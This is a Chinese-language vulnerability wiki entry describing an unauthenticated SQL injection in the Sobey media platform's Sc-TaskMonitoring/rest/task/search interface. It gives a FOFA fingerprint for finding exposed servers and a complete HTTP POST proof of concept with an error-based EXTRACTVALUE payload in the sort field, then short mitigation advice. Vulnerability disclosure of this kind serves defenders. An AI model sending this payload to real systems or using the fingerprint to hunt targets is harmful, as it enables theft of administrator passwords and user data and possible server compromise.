# 索贝融媒体 Sc-TaskMonitoringresttasksearch SQL注入漏洞

# 漏洞描述

索贝融媒体 Sc-TaskMonitoring/rest/task/search 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

索贝融媒体

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="689611853"

POC/EXP：

POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/json
Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 AND EXTRACTVALUE(8342,CONCAT(0x7e,0x7171787171,(SELECT (ELT(8342=8342,1))),0x716b706b71,0x7e))","desc":true}}

![image-20241121165551118](./.resource/索贝融媒体Sc-TaskMonitoringresttasksearchSQL注入漏洞/media/image-20241121165551118.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
